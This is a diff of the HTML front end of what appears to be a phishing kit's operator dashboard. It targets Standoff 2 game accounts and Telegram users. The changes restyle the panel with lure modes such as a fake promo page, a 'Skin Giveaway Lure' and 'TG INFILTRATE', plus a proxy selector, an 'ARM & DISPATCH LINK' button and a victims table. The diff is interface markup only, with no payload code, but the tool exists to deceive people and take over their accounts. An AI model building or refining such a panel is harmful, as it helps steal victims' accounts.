@@ -83,81 +83,73 @@
       <div class="dashboard-container">
 
         <!-- Header -->
-        <header class="dash-header">
+        <header class="dash-header" style="padding-bottom:0.8rem;border-bottom:1px solid var(--border-color);margin-bottom:1rem;">
           <div class="dash-header-left">
-            <span class="logo-icon-small">✝</span>
-            <span class="logo-text-small">ANTICHRIST</span>
+            <span class="logo-icon-small" id="header-logo-icon">⚡</span>
+            <span class="logo-text-small" id="header-console-title" style="letter-spacing:2px;">GHOST // CONSOLE</span>
           </div>
-          <div class="dash-header-right">
-            <span class="status-indicator">
+          <div class="dash-header-right" style="display:flex;align-items:center;gap:0.5rem;">
+            <span class="status-indicator" style="font-size:0.7rem;">
               <span class="status-dot online"></span>
-              ONLINE
+              ROOT
             </span>
-            <span class="links-badge" id="user-badge" style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-red);">
-              <span id="header-user-nick">USER</span>
+            <span class="links-badge" id="user-badge" style="font-family:var(--font-mono);font-size:0.75rem;padding:0.2rem 0.6rem;background:var(--bg-card);border:1px solid var(--border-color);border-radius:4px;">
+              <span id="header-user-nick" style="color:var(--accent-primary);">OPERATOR // LO</span>
             </span>
-            <button id="btn-logout" title="Switch Key / Re-login" style="background:transparent;border:1px solid #333;color:#888;padding:0.2rem 0.5rem;font-size:0.65rem;border-radius:3px;">KEY</button>
-            <span class="version-tag">v3.1.7</span>
+            <button id="btn-admin-godmode" style="display:none;background:var(--accent-primary-glow);border:1px solid var(--accent-primary);color:var(--accent-primary);font-weight:bold;font-family:var(--font-mono);padding:0.25rem 0.7rem;font-size:0.7rem;border-radius:4px;cursor:pointer;">
+              ⚡ GOD-MODE ADMIN
+            </button>
+            <button id="btn-logout" title="Switch Key / Re-login" style="background:transparent;border:1px solid var(--border-color);color:var(--text-dim);padding:0.25rem 0.5rem;font-size:0.65rem;border-radius:4px;cursor:pointer;">KEY</button>
           </div>
         </header>
 
-        <!-- Target Selection -->
-        <div class="section">
-          <h3 class="section-title">TARGET PLATFORM</h3>
-          <div class="target-single">
-            <div class="target-card selected" data-target="standoff2">
-              <div class="target-icon">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round">
-                  <circle cx="12" cy="12" r="10"/>
-                  <line x1="12" y1="2" x2="12" y2="6"/>
-                  <line x1="12" y1="18" x2="12" y2="22"/>
-                  <line x1="2" y1="12" x2="6" y2="12"/>
-                  <line x1="18" y1="12" x2="22" y2="12"/>
-                  <circle cx="12" cy="12" r="4"/>
-                </svg>
-              </div>
-              <div class="target-info">
-                <div class="target-name">Standoff 2</div>
-                <div class="target-desc">Account phishing module</div>
-              </div>
-              <div class="target-status">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2"><circle cx="12" cy="12" r="5" fill="var(--accent-green)"/></svg>
-                <span class="text-green" style="font-size:0.7rem">ACTIVE</span>
-              </div>
+        <!-- Tactical Scenario Cards -->
+        <div class="section" style="padding:0;margin-bottom:1.2rem;">
+          <h3 class="section-title">TACTICAL OPERATION MODULE</h3>
+          <div class="link-types-grid" style="display:grid;grid-template-columns:repeat(2, 1fr);gap:0.75rem;margin-bottom:0.5rem;">
+            <div class="link-type-card selected" data-type="browser-promo" style="background:var(--bg-card);border:1px solid var(--accent-primary);box-shadow:0 0 10px var(--accent-primary-glow);padding:0.9rem 0.75rem;border-radius:8px;cursor:pointer;text-align:center;transition:all 0.2s;">
+              <div style="font-size:1.3rem;margin-bottom:0.2rem;">🎯</div>
+              <div style="font-size:0.85rem;font-weight:700;letter-spacing:1px;color:#fff;margin-bottom:0.2rem;font-family:var(--font-mono);">SO2 PROTOCOL</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Promo Page Gateway</div>
             </div>
-          </div>
-        </div>
-
-        <!-- Link Type Selection -->
-        <div class="section">
-          <h3 class="section-title">LINK TYPE & SCENARIO</h3>
-          <div class="link-types-grid" style="display:grid;grid-template-columns:repeat(auto-fit, minmax(130px, 1fr));gap:0.75rem;margin-bottom:1rem;">
-            <div class="link-type-card selected" data-type="browser-promo" style="background:#111;border:1px solid var(--accent-red);padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
-              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">🌐 Web Promo</div>
-              <div style="font-size:0.65rem;color:var(--text-dim);">Активация промо (фейк загрузка)</div>
+            <div class="link-type-card" data-type="tg-user" style="background:var(--bg-secondary);border:1px solid var(--border-color);padding:0.9rem 0.75rem;border-radius:8px;cursor:pointer;text-align:center;transition:all 0.2s;">
+              <div style="font-size:1.3rem;margin-bottom:0.2rem;">✈️</div>
+              <div style="font-size:0.85rem;font-weight:700;letter-spacing:1px;color:var(--text-secondary);margin-bottom:0.2rem;font-family:var(--font-mono);">TG INFILTRATE</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Target @username</div>
             </div>
-            <div class="link-type-card" data-type="browser-official" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
-              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">🌐 Web Official</div>
-              <div style="font-size:0.65rem;color:var(--text-dim);">Официальный сайт редирект</div>
+            <div class="link-type-card" data-type="browser-promo-knife" style="background:var(--bg-secondary);border:1px solid var(--border-color);padding:0.9rem 0.75rem;border-radius:8px;cursor:pointer;text-align:center;transition:all 0.2s;">
+              <div style="font-size:1.3rem;margin-bottom:0.2rem;">🎁</div>
+              <div style="font-size:0.85rem;font-weight:700;letter-spacing:1px;color:var(--text-secondary);margin-bottom:0.2rem;font-family:var(--font-mono);">BAIT VAULT</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Skin Giveaway Lure</div>
             </div>
-            <div class="link-type-card" data-type="tg-user" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
-              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">✈️ TG Username</div>
-              <div style="font-size:0.65rem;color:var(--text-dim);">Таргет по @юзернейму</div>
-            </div>
-            <div class="link-type-card" data-type="tg-link" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
-              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">✈️ TG Link</div>
-              <div style="font-size:0.65rem;color:var(--text-dim);">Таргет по t.me/ каналу</div>
+            <div class="link-type-card" data-type="browser-official" style="background:var(--bg-secondary);border:1px solid var(--border-color);padding:0.9rem 0.75rem;border-radius:8px;cursor:pointer;text-align:center;transition:all 0.2s;">
+              <div style="font-size:1.3rem;margin-bottom:0.2rem;">📡</div>
+              <div style="font-size:0.85rem;font-weight:700;letter-spacing:1px;color:var(--text-secondary);margin-bottom:0.2rem;font-family:var(--font-mono);">FAST FORWARD</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Direct Pass Proxy</div>
             </div>
           </div>
         </div>
 
         <!-- Attack Configuration -->
-        <div class="section">
-          <h3 class="section-title">ATTACK CONFIGURATION</h3>
+        <div class="section" style="padding:0;margin-bottom:1.2rem;">
+          <h3 class="section-title">OPERATION PARAMETERS</h3>
           
-          <div class="config-group">
-            <label class="input-label" for="target-input">TARGET URL / USERNAME</label>
-            <input type="text" id="target-input" class="input-field mono" placeholder="Enter profile URL or username..." autocomplete="off" spellcheck="false">
+          <div class="config-group" style="margin-bottom:1rem;">
+            <label class="input-label" for="target-input">TARGET DESTINATION / PROFILE</label>
+            <input type="text" id="target-input" class="input-field mono" placeholder="Target endpoint or seed..." autocomplete="off" spellcheck="false" style="border-radius:6px;">
+          </div>
+
+          <!-- THEME SELECTOR -->
+          <div class="config-group" style="margin-bottom:1rem;background:var(--bg-secondary);border:1px solid var(--border-color);padding:0.8rem;border-radius:8px;">
+            <label class="input-label" style="margin-bottom:0.6rem;">VISUAL INTERFACE THEME</label>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.5rem;">
+              <button type="button" class="theme-btn active" data-set-theme="ghost" style="padding:0.5rem;font-family:var(--font-mono);font-size:0.75rem;border-radius:6px;cursor:pointer;background:#1a1d26;border:1px solid #38bdf8;color:#fff;">
+                ⚔️ GHOST STEALTH
+              </button>
+              <button type="button" class="theme-btn" data-set-theme="neon" style="padding:0.5rem;font-family:var(--font-mono);font-size:0.75rem;border-radius:6px;cursor:pointer;background:#100b1a;border:1px solid #3b1d5c;color:#cbd5e1;">
+                🔮 NEON SHADOW
+              </button>
+            </div>
           </div>
 
           <div class="toggles-grid">
@@ -193,9 +185,9 @@
             </div>
           </div>
 
-          <div class="config-group">
-            <label class="input-label" for="proxy-select">PROXY SERVER</label>
-            <select id="proxy-select" class="input-field mono">
+          <div class="config-group" style="margin-top:1rem;">
+            <label class="input-label" for="proxy-select">PROXY NODE</label>
+            <select id="proxy-select" class="input-field mono" style="border-radius:6px;">
               <option value="RU-7">RU-7 Moscow (47ms)</option>
               <option value="RU-3">RU-3 Saint Petersburg (52ms)</option>
               <option value="EU-1">EU-1 Frankfurt (89ms)</option>
@@ -208,8 +200,8 @@
         </div>
 
         <!-- Generate Button -->
-        <button class="btn-generate btn-pulse" id="btn-generate">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;margin-right:6px"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10"/></svg>GENERATE LINK
+        <button class="btn-generate" id="btn-generate" style="background:var(--btn-main-bg);color:var(--btn-main-text);font-weight:bold;font-family:var(--font-mono);font-size:0.95rem;padding:1rem;border-radius:8px;border:none;box-shadow:0 0 20px var(--accent-primary-glow);cursor:pointer;margin-bottom:1rem;letter-spacing:1.5px;width:100%;">
+          ⚡ [ARM & DISPATCH LINK]
         </button>
 
         <!-- Log Ticker Footer -->
@@ -366,8 +358,9 @@
           </div>
         </div>
 
-        <div class="victims-table-wrapper">
-          <table class="victims-table" id="victims-table">
+          <div id="victims-cards-list" style="display:flex;flex-direction:column;gap:0.6rem;margin-bottom:0.5rem;"></div>
+
+          <table class="victims-table" id="victims-table" style="display:none;">
             <thead>
               <tr>
                 <th>#</th>
